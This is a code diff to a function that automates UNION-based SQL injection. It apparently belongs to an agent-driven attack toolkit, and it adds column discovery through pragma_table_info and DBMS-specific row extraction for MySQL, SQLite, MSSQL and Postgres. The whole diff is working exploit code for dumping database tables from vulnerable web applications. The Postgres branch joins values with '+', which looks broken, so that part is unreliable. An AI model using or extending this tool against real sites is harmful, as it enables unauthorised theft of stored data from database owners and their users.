@@ -201,7 +201,18 @@ def sqli_union_dump(url_template, dbms="auto", table=None, columns=None, max_row
             m = __import__("re").search(r"~(CREATE TABLE.*?{0,40})~", body or "", __import__("re").S)
             cols = __import__("re").findall(r"[\"'`\[]?(\w+)[\"'`\]]?\s+(?:TEXT|INT|INTEGER|REAL|BLOB|VARCHAR|DATETIME|\w+\(\d+\))",
                                             (m.group(1) if m else body)[:400], __import__("re").I)
-            columns = [c for c in cols if c.lower() not in ("create", "table")][:12] or ["rowid"]
+            columns = [c for c in cols if c.lower() not in ("create", "table")][:12]
+            # WF2 (audit-2 F2): a non-standard schema broke the CREATE
+            # TABLE regex → fallback ["rowid"] → empty dump. Try pragma-
+            # style column mining before giving up.
+            if not columns:
+                st2, body2, _ = paced_send(apply_template(
+                    url_template,
+                    union_query(_concat(dbms, f"name FROM pragma_table_info('{table}')"))))
+                columns = [c for c in sorted(set(__import__("re").findall(r"~(.{1,48}?)~", body2 or "")))
+                           if c.strip() and "error" not in c.lower()][:12]
+            if not columns:
+                columns = ["*"]        # wildcard beats a useless rowid-only dump
         else:
             ti, cn, _sn = _INFO_TABLES["mysql"]
             col_expr = _concat(dbms, f"column_name FROM information_schema.columns WHERE table_name='{table}'")
@@ -215,9 +226,19 @@ def sqli_union_dump(url_template, dbms="auto", table=None, columns=None, max_row
         expr = _concat(dbms, f"* FROM {table}")
     else:
         inner = ",".join(columns)
-        expr = _concat(dbms, f"CONCAT_WS('|',{inner}) FROM {table}")
-        if dbms == "sqlite":
+        # WC5 (audit-2 C5): CONCAT_WS is MySQL-only — the probe and column
+        # discovery SUCCEEDED on Postgres/MSSQL then the extraction died
+        # with a syntax error the agent read as "no rows rendered".
+        if dbms == "mysql":
+            expr = _concat(dbms, f"CONCAT_WS('|',{inner}) FROM {table}")
+        elif dbms == "sqlite":
             expr = _concat(dbms, "group_concat(" + inner + ",'|') FROM " + table)
+        elif dbms == "mssql":
+            cols = "+'|'+".join(f"CAST({c} AS varchar(4000))" for c in columns)
+            expr = _concat(dbms, f"{cols} FROM {table}")
+        else:  # pg + generic
+            cols = "+'|'+".join(f"CAST({c} AS TEXT)" for c in columns)
+            expr = _concat(dbms, f"{cols} FROM {table}")
     st, body, dt = paced_send(apply_template(url_template, union_query(expr)))
     raw = __import__("re").findall(r"~(.*?)~", body or "", __import__("re").S)
     rows = [r for r in raw if r.strip() and probe not in r and len(r) < 2000][:max_rows]
